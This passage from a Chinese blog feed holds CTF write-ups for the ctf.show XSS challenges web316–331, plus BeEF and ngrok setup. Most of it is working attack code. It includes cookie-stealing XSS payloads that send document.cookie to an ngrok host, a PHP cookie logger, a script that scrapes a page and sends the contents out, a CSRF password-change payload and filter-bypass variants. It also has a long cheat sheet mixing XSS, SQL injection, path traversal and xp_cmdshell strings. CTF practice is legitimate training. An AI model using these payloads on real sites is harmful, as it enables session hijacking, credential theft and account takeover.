file_get_contents(‘php:&#x2F;&#x2F;input’);#xml文件来源于数据流<br>if(isset($xmlfile))</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/ctfshow/ctf.show/XSS/"/>
      <url>/ctfshow/ctf.show/XSS/</url>
      
        <content type="html"><![CDATA[<h1 id="kali之beef使用"><a href="#kali之beef使用" class="headerlink" title="kali之beef使用"></a>kali之beef使用</h1><p>发现没装beef</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405104440084.png" alt="image-20220405104440084"></p><p>安装的时候出来问题</p><pre><code>sudo dpkg --configure -a</code></pre><p>安装beef</p><pre><code>apt install beef-xss        </code></pre><p>改一下默认密码</p><pre><code>vim /etc/beef-xss/config.yaml</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405125752524.png" alt="image-20220405125752524"></p><p>启动beef</p><pre><code>/usr/share/beef-xss/beef</code></pre><p>在后台启动</p><pre><code>/usr/share/beef-xss/beef &amp;</code></pre><p>打开浏览器访问：<a href="http://192.168.5.152:3000/ui/authentication">http://192.168.5.152:3000/ui/authentication</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405125950419.png" alt="image-20220405125950419"></p><p>安装<a href="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz">ngrok</a>反向代理服务,解压</p><pre><code>tar -zxvf ngrok-stable-linux-amd64.tgz</code></pre><p>授权</p><pre><code>./ngrok authtoken [token码]</code></pre><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><pre><code>&lt;script&gt;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&lt;/script&gt;&lt;script&gt;var img=document.createElement(&quot;img&quot;); img.src=&quot;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&quot;+document.cookie;&lt;/script&gt;&lt;script&gt;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&lt;/script&gt;&lt;script&gt;window.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&lt;/script&gt;&lt;script&gt;location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&lt;/script&gt;&lt;input onfocus=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot; autofocus&gt;&lt;svg onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;body onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;iframe onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre><pre><code>&lt;script&gt;alert(&#39;hello，gaga!&#39;);&lt;/script&gt; //经典语句&gt;&quot;&#39;&gt;&lt;img src=&quot;javascript.:alert(&#39;XSS&#39;)&quot;&gt;&gt;&quot;&#39;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;table background=&#39;javascript.:alert(([code])&#39;&gt;&lt;/table&gt;&lt;object type=text/html data=&#39;javascript.:alert(([code]);&#39;&gt;&lt;/object&gt;&quot;+alert(&#39;XSS&#39;)+&quot;&#39;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;=&#39;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(vulnerable)&lt;/script&gt;&lt;s&amp;#99;ript&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;img src=&quot;javas&amp;#99;ript:alert(&#39;XSS&#39;)&quot;&gt;%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;a.jsp/&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;&lt;IMG SRC=&quot;javascript.:alert(&#39;XSS&#39;);&quot;&gt;&lt;IMG src=&quot;/javascript.:alert&quot;(&#39;XSS&#39;)&gt;&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#39;XSS&#39;)&gt;&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&amp;quot;XSS&amp;quot;)&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript.:alert(&#39;XSS&#39;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript.:alert(&#39;XSS&#39;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript.:alert(&#39;XSS&#39;);&quot;&gt;&quot;&lt;IMG src=&quot;/java&quot;\0script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39;&gt;out&lt;IMG SRC=&quot; javascript.:alert(&#39;XSS&#39;);&quot;&gt;&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;&lt;BODY BACKGROUND=&quot;javascript.:alert(&#39;XSS&#39;)&quot;&gt;&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;&lt;IMG DYNSRC=&quot;javascript.:alert(&#39;XSS&#39;)&quot;&gt;&lt;IMG LOWSRC=&quot;javascript.:alert(&#39;XSS&#39;)&quot;&gt;&lt;BGSOUND SRC=&quot;javascript.:alert(&#39;XSS&#39;);&quot;&gt;&lt;br size=&quot;&amp;&#123;alert(&#39;XSS&#39;)&#125;&quot;&gt;&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#39;XSS&#39;);&quot;&gt;&lt;IMG SRC=&#39;vbscript.:msgbox(&quot;XSS&quot;)&#39;&gt;&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=javascript.:alert(&#39;XSS&#39;);&quot;&gt;&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#39;XSS&#39;)&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#39;XSS&#39;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#39;XSS&#39;)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#39;XSS&#39;))&quot;&gt;&lt;DIV STYLE=&quot;behaviour: url(&#39;http://www.how-to-hack.org/exploit.html&amp;#39;);&quot;&gt;&lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;&lt;IMG STYLE=&#39;xss:expre\ssion(alert(&quot;XSS&quot;))&#39;&gt;&lt;STYLE. TYPE=&quot;text/javascript&quot;&gt;alert(&#39;XSS&#39;);&lt;/STYLE&gt;&lt;STYLE. TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript.:alert(&#39;XSS&#39;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;&lt;STYLE. type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript.:alert(&#39;XSS&#39;)&quot;)&#125;&lt;/STYLE&gt;&lt;BASE HREF=&quot;javascript.:alert(&#39;XSS&#39;);//&quot;&gt;getURL(&quot;javascript.:alert(&#39;XSS&#39;)&quot;)a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript.:&quot;;d=&quot;alert(&#39;XSS&#39;);&quot;;eval(a+b+c+d);&lt;XML SRC=&quot;javascript.:alert(&#39;XSS&#39;);&quot;&gt;&quot;&gt; &lt;BODY NLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&#39;XSS&#39;);&#125;&lt;/SCRIPT&gt;&lt;&quot;&lt;SCRIPT. SRC=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;&lt;IMG SRC=&quot;javascript.:alert(&#39;XSS&#39;)&quot;&lt;SCRIPT. a=&quot;&gt;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT.=&quot;&gt;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT. a=&quot;&gt;&quot;&#39;&#39;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT.&quot;a=&#39;&gt;&#39;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PTSRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;%3Cscript%3Ealert(&#39;XSS&#39;)%3C/script%3E%22%3cscript%3ealert(%22xss%22)%3c/script%3e%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini%3f.jsp%3f.jsp&amp;lt;script&amp;gt;alert(&#39;Vulnerable&#39;);&amp;lt;/script&amp;gt?sql_debug=1a%5c.aspxa/a?&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;&#39;;exec%20master..xp_cmdshell%20&#39;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&#39;--&amp;&amp;%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=../../../../../../../../etc/passwd..\..\..\..\..\..\..\..\windows\system.ini\..\..\..\..\..\..\..\..\windows\system.ini&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;&lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt;&lt;IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS&amp;quot;)&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#39;XSS&#39;);&quot;&gt;&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39; &gt; out&lt;IMG SRC=&quot; javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;BODY BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;IMG DYNSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;BGSOUND SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;IMG SRC=&#39;vbscript:msgbox(&quot;XSS&quot;)&#39;&gt;&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;IFRAME SRC=javascript:alert(&#39;XSS&#39;)&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=javascript:alert(&#39;XSS&#39;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&#39;XSS&#39;);&lt;/STYLE&gt;&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)&#125;&lt;/STYLE&gt;&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;getURL(&quot;javascript:alert(&#39;XSS&#39;)&quot;)a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#39;XSS&#39;);&quot;;eval(a+b+c+d);&lt;XML SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&#39;XSS&#39;);&#125;&lt;/SCRIPT&gt;&lt;&quot;&lt;SCRIPT SRC=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&lt;!--#exec cmd=&quot;/bin/echo &#39;&lt;SCRIPT SRC&#39;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &#39;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&#39;&quot;--&gt;&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&quot; &#39;&#39; SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT &quot;a=&#39;&gt;&#39;&quot; SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;admin&#39;--&#39; or 0=0 --&quot; or 0=0 --or 0=0 --&#39; or 0=0 #&quot; or 0=0 #or 0=0 #&#39; or &#39;x&#39;=&#39;x&quot; or &quot;x&quot;=&quot;x&#39;) or (&#39;x&#39;=&#39;x&#39; or 1=1--&quot; or 1=1--or 1=1--&#39; or a=a--&quot; or &quot;a&quot;=&quot;a&#39;) or (&#39;a&#39;=&#39;a&quot;) or (&quot;a&quot;=&quot;ahi&quot; or &quot;a&quot;=&quot;ahi&quot; or 1=1 --hi&#39; or 1=1 --hi&#39; or &#39;a&#39;=&#39;ahi&#39;) or (&#39;a&#39;=&#39;ahi&quot;) or (&quot;a&quot;=&quot;a</code></pre><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281103297.png" alt="image-20220328110313250"></p><p>有回显测试一下有无xss</p><pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281104410.png" alt="image-20220328110419356"></p><p><a href="http://xsscom.com//%E5%8E%BB%E5%9C%A8%E7%BA%BFxss%E5%B9%B3%E5%8F%B0%E4%B8%8A%E6%B5%8B%E8%AF%95%E4%B8%8B,%E5%A6%82%E6%9E%9C%E6%9C%89%E5%85%AC%E7%BD%91%E5%9C%B0%E5%9D%80%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA">http://xsscom.com//去在线xss平台上测试下,如果有公网地址也可以自己搭建</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281116021.png" alt="image-20220328111645980"></p><p>复制上面的代码到存在xss的地方去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281117713.png" alt="image-20220328111724666"></p><p>返还原先平台,发现返回了flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281119612.png" alt="image-20220328111951582"></p><p>但是这个网站不太好用</p><h2 id="自己的服务器放一个php代码"><a href="#自己的服务器放一个php代码" class="headerlink" title="自己的服务器放一个php代码"></a>自己的服务器放一个php代码</h2><pre><code># zf.php&lt;?php$cookie = $_GET[&#39;cookie&#39;];$log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);fwrite($log, $cookie . &quot;\n&quot;);fclose($log);?&gt;</code></pre><pre><code>// js代码&lt;script&gt;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&lt;/script&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405134200287.png" alt="image-20220405134200287"></p><h2 id="burp插件之xssvalidator"><a href="#burp插件之xssvalidator" class="headerlink" title="burp插件之xssvalidator"></a>burp插件之xssvalidator</h2><p>下载<a href="http://phantomjs.org/download.html">Phantomjs</a>下载后配置环境变量，把bin目录下的这个exe加入环境变量,也可以不加,直接使用绝对路径</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281211396.png" alt="image-20220328121150359"></p><p>下载<a href="https://github.com/nVisium/xssValidator">xss.js</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281212891.png" alt="image-20220328121239860"></p><p>运行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281219376.png" alt="image-20220328121939347"></p><p>高版本的burp运行时会出现问题,这块使用2021.5.1的(后发现是汉化的原因)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281213423.png" alt="image-20220328121334340"></p><p>发送到intruder</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281215474.png" alt="image-20220328121533428"></p><p>添加位置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281215888.png" alt="image-20220328121546838"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281216620.png" alt="image-20220328121602545"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281216968.png" alt="image-20220328121620895"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281216182.png" alt="image-20220328121640108"></p><p>复制一下grep phrase</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405155808986.png" alt="image-20220405155808986"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405155821476.png" alt="image-20220405155821476"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281219191.png" alt="image-20220328121952137"></p><p>添加高亮 先下hae插件.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281238667.png" alt="image-20220328123824620"></p><pre><code>((q=)|(s=)|(search=)|(id=)|(lang=)|(keyword=)|(query=)|(page=)|(keywords=)|(year=)|(view=)|(email=)|(type=)|(name=)|(p=)|(month=)|(immagine=)|(list_type=)|(url=)|(terms=)|(categoryid=)|(key=)|(l=)|(begindate=)|(enddate=)|(message=)|(user=)|(type_name=)|(status=))</code></pre><p>添加正则匹配</p><h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script</p><pre><code>&lt;body onload=&quot;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;&lt;input onfocus=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot; autofocus&gt;&lt;svg onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;iframe onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405160931275.png" alt="image-20220405160931275"></p><h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><pre><code>&lt;input onfocus=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot; autofocus&gt;&lt;svg onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;body onload=&quot;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></pre><h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><pre><code>&lt;input onfocus=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot; autofocus&gt;&lt;svg onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;body onload=&quot;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;&lt;iframe    onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre><h1 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h1><p>把空格过滤了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405191207472.png" alt="image-20220405191207472"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405191152855.png" alt="image-20220405191152855"></p><pre><code>%09     TAB水平%0a     新建一行%0c        新建一页%0d        return功能%0b        TAB(垂直)%a0        空格</code></pre><p>空格的替换方式,我们都试一下</p><p>%09的替换可以</p><pre><code>&lt;body    onload=&quot;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;&lt;svg    onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;input    onfocus=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;    autofocus&gt;&lt;iframe    onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre><p>%0c的替换可以</p><pre><code>&lt;svgonload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;inputonfocus=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;autofocus&gt;&lt;bodyonload=&quot;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;&lt;iframeonload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre><pre><code>&lt;svg/onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;input/onfocus=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;/autofocus&gt;&lt;body/onload=&quot;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;&lt;iframe/onload=&quot;window.open(&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre><p>别的会出现这个样子,可以自己尝试一下,感觉可行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405193205662.png" alt="image-20220405193205662"></p><h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405211412442.png" alt="image-20220405211412442"></p><p>xss盲打就好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405211710498.png" alt="image-20220405211710498"></p><p>收件人要填admin哦</p><h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405212809419.png" alt="image-20220405212809419"></p><p>有四个页面,都盲打试一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405212826900.png" alt="image-20220405212826900"></p><p>  没得到flag,得到俩sessid,应该有个自己的,都试一下吧</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405213151236.png" alt="image-20220405213151236"></p><p>记得要改两次哦</p><h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>这道题目和上一道差不多,但是是模拟的cookie会过期怎么办,那么我们可以通过这样</p><pre><code>&lt;script&gt;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#39;+document.cookie&lt;/script&gt;</code></pre><p>这是之前的方法,也就是直接将cookie发送到php页面</p><p>现在我们将js直接嵌入他的html上面,当然这里可以直接写进去密码里面,也可以通过远程加载一个js文件的方式来执行js,仔细思考一下就会发现其他网页的js文件好像也是这么加载的吧</p><p>创建一个load.js</p><pre><code class="javascript">var img = new Image();img.src = &quot;http://fb53-111-17-194-91.ngrok.io/accept.php?q=&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;document.body.append(img);</code></pre><p>至于这里为什么这么写,我也不会,大概含义通过定位把用户名和密码给取出来,然后发送到accept.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405214657340.png" alt="image-20220405214657340"></p><p>在创建一个accept.php用来接收flag</p><pre><code class="php">&lt;?php $cookie = $_GET[&#39;q&#39;]; $myFile = &quot;cookie.txt&quot;; file_put_contents($myFile, $cookie, FILE_APPEND); ?&gt; </code></pre><p>接着插入</p><pre><code>&lt;script src=http://fb53-111-17-194-91.ngrok.io/load.js&gt;&lt;/script&gt;&lt;script&gt;document.location.href=&#39;http://fb53-111-17-194-91.ngrok.io/load.js&#39;&lt;/script&gt;</code></pre><p>思路是这样的,但是不知道为什么load.js就是不访问accept.php文件.可能是代码有问题</p><h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222113792.png" alt="image-20220405222113792"></p><p>有一个修改密码页面,没有验证码,也没有源密码验证,可能存在xsrf</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222128926.png" alt="image-20220405222128926"></p><pre><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=123&#39;;&lt;/script&gt;</code></pre><p>接着我们就使用admin 123登录就好了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222336255.png" alt="image-20220405222336255"></p><h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p><img 